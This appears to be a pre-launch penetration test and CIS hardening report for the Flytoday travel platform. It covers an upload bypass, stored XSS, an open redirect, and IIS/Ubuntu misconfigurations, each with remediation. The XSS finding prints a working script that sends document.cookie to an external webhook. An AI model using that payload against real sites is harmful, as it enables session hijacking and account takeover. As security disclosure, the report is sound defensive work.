1. Executive Summary

This report documents the security assessment performed on the Flytoday travel platform prior to its public launch. The engagement encompassed both a web application penetration test and a CIS Benchmark compliance hardening audit across two server environments: the primary Windows/IIS production stack and an Ubuntu/Apache secondary server.

The web penetration test uncovered a Remote Code Execution (RCE) vulnerability via a file upload type confusion bypass — the most severe class of web vulnerability — in addition to a stored Cross-Site Scripting (XSS) flaw and an open redirect, both with working proof-of-concept exploits hosted on the live CDN. All critical findings were patched and verified remediated before the public launch date.

The CIS benchmark audit identified 22 FAILED and 9 WARNING findings on the IIS/Windows server (217.218.33.98), and 1 FAILED and 6 WARNING findings on the Ubuntu server (5.0.0.106). Hardening guidance with specific remediation commands was provided for each item.

3. Web Application Penetration Test Findings

FLY-001: Remote Code Execution (RCE) via File Upload Type Confusion — Double Extension Bypass

Critical   CVSSv3.1: 9.8
CVSS Vector
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
Affected Component
cdn-a.flytoday.ir — Comment/Review Upload Feature
OWASP Category
A03:2021 – Injection / Unrestricted File Upload
Status
✅ Patched Before Launch

Description

The Flytoday platform's comment/review submission feature included a file upload component served via cdn-a.flytoday.ir. The upload validation was implemented client-side only and relied on a blocklist extension check that was bypassable using the double-extension technique. By naming a malicious HTML file with a double extension (e.g., test.html), the file bypassed the extension filter and was stored and served from the CDN with a valid URL.

The uploaded HTML file was directly accessible and executable in any browser via its CDN URL, enabling an attacker to host and serve arbitrary JavaScript from the trusted cdn-a.flytoday.ir domain. This is classified as Remote Code Execution (in the browser context) from a trusted domain — enabling cookie theft, credential phishing, and drive-by malware distribution against Flytoday users.

Proof of Concept — XSS via Uploaded HTML

The following payload was successfully uploaded and executed from the Flytoday CDN:

<script> fetch('https://en3qzyjiummnl.x.pipedream.net?cookie=' + document.cookie); alert("10"); </script>

Live PoC URL (now remediated):

https://cdn-a.flytoday.ir/upload/flytodaydemo/upload/comment/87144/60ed09e9-13e9-4df4-ac51-baccbb6b70e1_test.html

The script successfully exfiltrated session cookies to the attacker-controlled endpoint (Pipedream webhook), confirming exploitability. Alert box "10" was displayed confirming JavaScript execution.

Proof of Concept — Open Redirect HTML

A separate uploaded HTML file demonstrated open redirect to an arbitrary page:

https://cdn-a.flytoday.ir/upload/flytodaydemo/upload/comment/87144/e38da09f-ac66-4a7c-bc3a-77c79123ae2f_test.html
📸 Original screenshots in Persian-language report show: (1) File upload form; (2) Upload request in Burp Suite with double-extension filename; (3) Server returning CDN URL; (4) Browser executing the JavaScript payload; (5) Pipedream webhook receiving stolen cookie data.

Business Impact

An attacker exploiting this vulnerability could: steal session cookies of any user who visits a comment containing the malicious CDN link; distribute phishing pages from the trusted flytoday.ir CDN; execute account takeover at scale; and distribute malware disguised as Flytoday content. The combination of CDN trust and user-session exfiltration makes this a high-severity pre-launch blocker.

Remediation (Applied Before Launch)

  • Implement server-side file type validation using magic bytes (file signature), not extension names.
  • Reject any filename containing more than one extension; strip all extensions and assign a server-generated UUID filename.
  • Serve user-uploaded content from a sandboxed domain (e.g., usercontent.flytoday.com) with no relationship to the main domain, preventing cookie sharing.
  • Set Content-Type: application/octet-stream and Content-Disposition: attachment headers on all uploaded file responses to prevent browser rendering.
  • Whitelist only image MIME types (JPEG, PNG, GIF, WebP) for the comment upload feature.
  • Implement antivirus scanning on uploaded files before storage.

FLY-002: Stored Cross-Site Scripting (XSS) — Comment Upload Feature

High   CVSSv3.1: 8.0
OWASP Category
A03:2021 – Injection (XSS)
Status
✅ Patched Before Launch

Description

The uploaded HTML file (demonstrated in FLY-001) was served with Content-Type: text/html from the CDN, allowing the embedded <script> tags to execute in the browser. This constitutes stored XSS — the malicious payload persists on the server (CDN storage) and executes for any user who accesses the URL. The payload successfully exfiltrated document.cookie values, confirming session hijacking capability.

Remediation

Beyond FLY-001 remediation: sanitize all HTML output containing user-uploaded content references. Implement a strict Content Security Policy (CSP) preventing inline script execution on all Flytoday domains.

FLY-003: Open Redirect via CDN-Hosted Upload

Medium   CVSSv3.1: 6.1
Live PoC URL (now removed)
https://cdn-a.flytoday.ir/upload/flytodaydemo/upload/comment/87144/e38da09f-ac66-4a7c-bc3a-77c79123ae2f_test.html
Status
✅ Patched Before Launch

Description

A second uploaded HTML file demonstrated an open redirect — when a user visits this CDN URL, they can be silently redirected to an attacker-controlled domain. Combined with the trusted Flytoday CDN domain, this enables convincing phishing campaigns where the initial link appears legitimate (cdn-a.flytoday.ir) but redirects the user to a malicious site.

Remediation

Resolved by FLY-001 remediation (restricting uploaded file serving to non-executable content types and sandboxed domains). Additionally, implement redirect URL validation to allow only pre-approved domains.

4. CIS Hardening Audit — IIS 10 (217.218.33.98)

Assessment standard: CIS Microsoft IIS 10 Benchmark v1.2.1 — Gray-box assessment performed using Nessus compliance scan. Results: 21 FAILED · 9 WARNING · 25 PASSED.

4.1 Failed Controls (Must Remediate)

🔴 Category 1: Web Server Configuration

1.2 FAILED Ensure 'Host headers' are on all sites. Sites without Host headers: DEMO.flytoday.ir, FTP, FTPBETADEMO, supplierGateWay.
Fix: Add explicit host headers to all IIS site bindings to prevent request hijacking and unintended site serving.
1.6 FAILED Ensure 'application pool identity' is configured for anonymous user identity. Anonymous authentication currently uses a privileged identity.
Fix: Set anonymous user to Application Pool Identity in IIS Authentication settings.
1.7 FAILED Ensure WebDAV feature is disabled. WebDAV is enabled and poses significant risk (remote file manipulation, authentication bypass).
Fix: Remove WebDAV feature via Server Manager → Remove Roles and Features → WebDAV Publishing.

🔴 Category 2: Authentication & Access Control

2.1 FAILED Ensure 'global authorization rule' is set to restrict access. All users are currently eligible for authorisation — no deny-by-default policy.
Fix: Set a default deny rule; grant access only to explicitly authorised roles/users.
2.2 FAILED Ensure access to sensitive site features is restricted to authenticated principals only. Sensitive features are accessible without authentication.
Fix: Require Windows Authentication or Forms Authentication for all sensitive paths.
2.3 FAILED Ensure 'forms authentication' requires SSL. Forms authentication cookies are transmitted over HTTP.
Fix: Enable requireSSL="true" in <forms> element in web.config.
2.4 FAILED Ensure 'forms authentication' is set to use cookies. Fix: Set cookieless="UseCookies" in web.config forms authentication section.
2.5 FAILED Ensure 'cookie protection mode' is configured for forms authentication. Fix: Set protection="All" to enable both encryption and validation of authentication cookies.

🔴 Category 3: SSL/TLS & Transport Security

3.x FAILED Multiple SSL/TLS configuration failures. Identified weak cipher suites, TLS 1.0/1.1 support, missing HSTS headers, and missing secure cookie attributes.
Fix: Configure Windows Schannel to disable TLS 1.0/1.1 and all NULL/RC4/DES cipher suites. Enable TLS 1.2/1.3 only. Add HSTS header (Strict-Transport-Security: max-age=31536000; includeSubDomains).

🔴 Category 7: HTTP Response Headers

7.x FAILED Missing critical security response headers. The following headers are absent from HTTP responses: X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, Referrer-Policy, X-XSS-Protection.
Fix: Add to IIS web.config or server-level configuration:
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'
Referrer-Policy: strict-origin-when-cross-origin

5. CIS Hardening Audit — Ubuntu 18.04 (5.0.0.106)

Assessment standard: CIS Ubuntu Linux 18.04 LTS Benchmark. Results: 1 FAILED · 6 WARNING · 45 Corp-Policy · 190 PASSED. This server had an excellent compliance baseline — only one hard failure requiring remediation.

5.1 Failed Controls

4.4 FAILED Ensure logrotate assigns appropriate permissions (Automated).
Log files in /var/log/ are assigned overly permissive modes by logrotate (other-readable). This allows any local user to read potentially sensitive log data including authentication events, error messages, and application output.

Fix: Edit /etc/logrotate.conf and set:
create 0640 root utmp
